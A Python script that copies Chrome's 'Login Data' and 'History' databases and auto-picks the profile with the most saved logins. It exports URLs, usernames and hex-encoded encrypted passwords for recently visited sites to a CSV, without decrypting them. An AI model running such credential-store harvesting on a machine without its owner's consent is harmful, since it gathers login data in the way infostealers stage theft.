import os
import sqlite3
import csv
import shutil
import datetime
import tempfile
import argparse
from urllib.parse import urlparse


def normalize_host(host: str) -> str:
    """Normalize hostnames for matching:

    - lowercases
    - strips port if present
    - strips leading 'www.'
    - strips trailing dot
    - attempts to decode punycode (xn--) to Unicode
    Returns the normalized host string or the input lowercased on failure.
    """
    if not host:
        return ""
    try:
        h = host.lower().strip()
        # remove port
        if ":" in h:
            h = h.split(":", 1)[0]
        # remove any trailing dot
        if h.endswith('.'):
            h = h[:-1]
        # remove leading www.
        if h.startswith("www."):
            h = h[4:]
        # try to decode punycode to unicode (e.g., xn--)
        try:
            # if it's ASCII-compatible and contains xn--, decode
            if "xn--" in h:
                h = h.encode('ascii').decode('idna')
        except Exception:
            # fall back to the original lowercased host
            pass
        return h
    except Exception:
        return host.lower()


def chrome_time_to_datetime(chrome_time):
    """Convert Chrome time (microseconds since 1601-01-01) to timezone-aware UTC datetime.

    Returns datetime.datetime with tzinfo=datetime.timezone.utc or None on failure.
    """
    try:
        if chrome_time and chrome_time > 0:
            epoch_start = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
            return epoch_start + datetime.timedelta(microseconds=int(chrome_time))
    except Exception as e:
        print(f"[TIME CONVERSION ERROR] {e}")
    return None


def domain_from_url(url):
    """Extract domain name from URL."""
    try:
        return urlparse(url).netloc.lower()
    except Exception:
        return ""


def export_logins(chrome_user_data, profile="Default", output_csv="chrome_encrypted_logins_clean.csv", debug=False,
                  days_back=14, use_login_last_used=False, include_no_history=False, match_by_host=True, normalize_hosts=True, full_report=False):
    login_db = os.path.join(chrome_user_data, profile, "Login Data")
    history_db = os.path.join(chrome_user_data, profile, "History")

    if not os.path.exists(login_db):
        print(f"ERROR: Login DB not found: {login_db}")
        return 1
    if not os.path.exists(history_db):
        print(f"ERROR: History DB not found: {history_db}")
        return 1

    # Create safe temporary files
    tmp_login = None
    tmp_history = None
    login_conn = None
    history_conn = None

    try:
        tmp_login = tempfile.NamedTemporaryFile(prefix="chrome_login_", delete=False)
        tmp_history = tempfile.NamedTemporaryFile(prefix="chrome_history_", delete=False)
        tmp_login.close()
        tmp_history.close()

        shutil.copy2(login_db, tmp_login.name)
        shutil.copy2(history_db, tmp_history.name)

        login_conn = sqlite3.connect(tmp_login.name)
        login_cursor = login_conn.cursor()

        history_conn = sqlite3.connect(tmp_history.name)
        history_cursor = history_conn.cursor()

        # Sort by most recently used logins
        login_cursor.execute("""
            SELECT origin_url, username_value, password_value, date_last_used 
            FROM logins 
            ORDER BY date_last_used DESC
        """)

        seen_domains = set()

        # Use timezone-aware UTC cutoff
        cutoff_time = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=days_back)

        # Build a map of host -> (last_visit_time_micro, visit_count) from the history DB if host matching is desired
        history_map = {}
        if match_by_host:
            try:
                history_cursor.execute("SELECT url, last_visit_time, visit_count FROM urls")
                for h_url, h_last, h_count in history_cursor.fetchall():
                    try:
                        h_host_raw = urlparse(h_url).netloc.lower()
                        if not h_host_raw:
                            continue
                        h_host = normalize_host(h_host_raw) if normalize_hosts else h_host_raw
                        # keep the most recent last_visit_time per host
                        cur = history_map.get(h_host)
                        if cur is None or (h_last is not None and h_last > cur[0]):
                            history_map[h_host] = (h_last, h_count)
                    except Exception:
                        continue
            except Exception as e:
                if debug:
                    print(f"[DEBUG] could not build history_map: {e}")

        # If full_report is requested, write a more detailed CSV that includes inclusion reason for every login
        with open(output_csv, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            if full_report:
                writer.writerow([
                    "origin_url",
                    "username",
                    "encrypted_password",
                    "login_date_last_used",
                    "history_last_visit",
                    "visit_count",
                    "match_method",
                    "included",
                    "reason",
                ])
            else:
                writer.writerow(["origin_url", "username", "encrypted_password", "last_visit", "visit_count"])

            login_rows = login_cursor.fetchall()
            if debug:
                print(f"[DEBUG] total logins fetched: {len(login_rows)}")
                if len(login_rows) > 0:
                    print("[DEBUG] sample login row:", login_rows[0])

            rows_written = 0
            history_queries = 0
            history_matches = 0

            for row in login_rows:
                origin_url = row[0]
                username = row[1]
                encrypted_password = row[2]
                last_used = row[3]

                if not username:
                    if debug:
                        print(f"[DEBUG] skipping origin (no username): {origin_url}")
                    continue  # skip logins without username

                domain_raw = domain_from_url(origin_url)
                # derive a dedupe/match key: normalized host when enabled, otherwise raw domain
                if match_by_host and normalize_hosts:
                    domain_key = normalize_host(domain_raw)
                else:
                    domain_key = domain_raw

                if not domain_raw or domain_key in seen_domains:
                    continue  # skip duplicates or invalid URLs

                seen_domains.add(domain_key)

                # Decide matching behavior
                matched = False
                last_visit = None
                visit_count = 0

                if match_by_host:
                    host = domain_key
                    history_queries += 1
                    cur = history_map.get(host)
                    if cur:
                        history_matches += 1
                        h_last, h_count = cur
                        last_visit_dt = chrome_time_to_datetime(h_last)
                        if last_visit_dt:
                            last_visit = last_visit_dt
                            visit_count = h_count or 0
                            matched = True
                else:
                    # Fallback to the original LIKE query
                    try:
                        history_queries += 1
                        history_cursor.execute("""
                            SELECT last_visit_time, visit_count 
                            FROM urls 
                            WHERE url LIKE ?
                            ORDER BY last_visit_time DESC LIMIT 1
                        """, ('%' + domain_raw + '%',))
                        history_row = history_cursor.fetchone()
                        if history_row:
                            history_matches += 1
                            last_visit_dt = chrome_time_to_datetime(history_row[0])
                            if last_visit_dt:
                                last_visit = last_visit_dt
                                visit_count = history_row[1]
                                matched = True
                    except sqlite3.Error as e:
                        if debug:
                            print(f"SQLite error while querying history for {domain_raw}: {e}")
                        matched = False

                # If requested, allow using the login table's date_last_used as the recency check
                if use_login_last_used:
                    try:
                        login_last_used_dt = chrome_time_to_datetime(last_used)
                    except Exception:
                        login_last_used_dt = None
                    if login_last_used_dt:
                        recent_enough = login_last_used_dt >= cutoff_time
                    else:
                        recent_enough = False
                else:
                    recent_enough = False

                # Determine whether to include this login:
                include_entry = False
                reason = ""
                match_method = "none"
                if matched and last_visit:
                    if last_visit >= cutoff_time:
                        include_entry = True
                    else:
                        if debug:
                            print(f"[DEBUG] skipping {origin_url}: last visit {last_visit.isoformat()} older than cutoff {cutoff_time.isoformat()}")
                        include_entry = False
                elif use_login_last_used and login_last_used_dt:
                    if login_last_used_dt >= cutoff_time:
                        include_entry = True
                    else:
                        if debug:
                            print(f"[DEBUG] skipping {origin_url}: login date_last_used {login_last_used_dt.isoformat()} older than cutoff {cutoff_time.isoformat()}")
                        include_entry = False
                else:
                    # No history match and not using login timestamp
                    include_entry = include_no_history

                if include_entry:
                    included_flag = True
                    reason = reason or "included"
                else:
                    included_flag = False
                    reason = reason or "filtered"

                # choose match_method label
                if matched:
                    match_method = "host" if match_by_host else "like"
                else:
                    match_method = "none"

                if full_report:
                    writer.writerow([
                        origin_url,
                        username,
                        encrypted_password.hex() if encrypted_password else "",
                        (chrome_time_to_datetime(last_used).isoformat() if chrome_time_to_datetime(last_used) else ""),
                        (last_visit.isoformat() if last_visit else ""),
                        visit_count,
                        match_method,
                        str(included_flag),
                        reason,
                    ])
                else:
                    # only write entries that are included for the simple CSV
                    if not include_entry:
                        continue
                    writer.writerow([
                        origin_url,
                        username,
                        encrypted_password.hex() if encrypted_password else "",
                        last_visit.isoformat() if last_visit else "",
                        visit_count
                    ])
                    rows_written += 1

            if debug:
                print(f"[DEBUG] history queries: {history_queries}, matches: {history_matches}, rows written: {rows_written}")

        return 0

    except Exception as e:
        print(f"Unexpected error in export_logins: {e}")
        return 2
    finally:
        try:
            if login_conn:
                login_conn.close()
        except Exception:
            pass
        try:
            if history_conn:
                history_conn.close()
        except Exception:
            pass
        # cleanup temp files
        try:
            if tmp_login and os.path.exists(tmp_login.name):
                os.remove(tmp_login.name)
        except Exception:
            pass
        try:
            if tmp_history and os.path.exists(tmp_history.name):
                os.remove(tmp_history.name)
        except Exception:
            pass


def list_profiles_with_login_data(chrome_user_data):
    """Return a list of profile folder names under chrome_user_data that contain a Login Data file."""
    profiles = []
    if not os.path.isdir(chrome_user_data):
        return profiles
    for entry in os.listdir(chrome_user_data):
        candidate = os.path.join(chrome_user_data, entry, "Login Data")
        if os.path.exists(candidate):
            profiles.append(entry)
    return profiles


def count_logins_for_profile(chrome_user_data, profile):
    """Return number of rows in the logins table for a profile (0 on error)."""
    login_db = os.path.join(chrome_user_data, profile, "Login Data")
    if not os.path.exists(login_db):
        return 0
    tmp = None
    conn = None
    try:
        tmp = tempfile.NamedTemporaryFile(prefix="chk_login_", delete=False)
        tmp.close()
        shutil.copy2(login_db, tmp.name)
        conn = sqlite3.connect(tmp.name)
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM logins")
        row = cur.fetchone()
        return int(row[0]) if row else 0
    except Exception:
        return 0
    finally:
        try:
            if conn:
                conn.close()
        except Exception:
            pass
        try:
            if tmp and os.path.exists(tmp.name):
                os.remove(tmp.name)
        except Exception:
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Export Chrome login metadata with history matching (no decryption).")
    parser.add_argument("--profile", default="Default", help="Chrome profile folder name (Default)")
    parser.add_argument("--output", default="chrome_encrypted_logins_clean.csv", help="Output CSV file")
    parser.add_argument("--debug", action="store_true", help="Print debug diagnostics")
    parser.add_argument("--days", type=int, default=14, help="Days back cutoff (default 14)")
    parser.add_argument("--use-login-last-used", dest="use_login_last_used", action="store_true", help="Use login.date_last_used as recency check")
    parser.add_argument("--include-no-history", dest="include_no_history", action="store_true", help="Include logins with no history match")
    parser.add_argument("--no-host-match", dest="match_by_host", action="store_false", help="Disable host-based matching and use LIKE instead")
    parser.add_argument("--no-normalize-hosts", dest="no_normalize_hosts", action="store_true", help="Disable host normalization when matching hosts")
    parser.add_argument("--full-report", dest="full_report", action="store_true", help="Write a full CSV report with inclusion reason for every login")
    args = parser.parse_args()

    chrome_user_data = os.path.join(os.environ.get("LOCALAPPDATA", ""), r"Google\Chrome\User Data")
    chosen_profile = args.profile
    # if user didn't explicitly request a profile (left as Default), try to auto-select the profile
    if args.profile == "Default":
        profiles = list_profiles_with_login_data(chrome_user_data)
        if profiles:
            # pick profile with most saved logins
            best = None
            best_count = 0
            for p in profiles:
                cnt = count_logins_for_profile(chrome_user_data, p)
                if args.debug:
                    print(f"[DEBUG] profile '{p}' has {cnt} saved logins")
                if cnt > best_count:
                    best_count = cnt
                    best = p
            if best and best_count > 0:
                chosen_profile = best
                if args.debug:
                    print(f"[DEBUG] auto-selected profile: {chosen_profile} ({best_count} logins)")

    rc = export_logins(
        chrome_user_data,
        profile=chosen_profile,
        output_csv=args.output,
        debug=args.debug,
        days_back=args.days,
        use_login_last_used=args.use_login_last_used,
        include_no_history=args.include_no_history,
        match_by_host=args.match_by_host,
        normalize_hosts=not args.no_normalize_hosts,
        # full_report is consumed below when writing rows
        full_report=args.full_report if 'full_report' in args else False,
    )
    if rc == 0:
        print(f"Cleaned encrypted logins exported to {args.output}")
    raise SystemExit(rc)
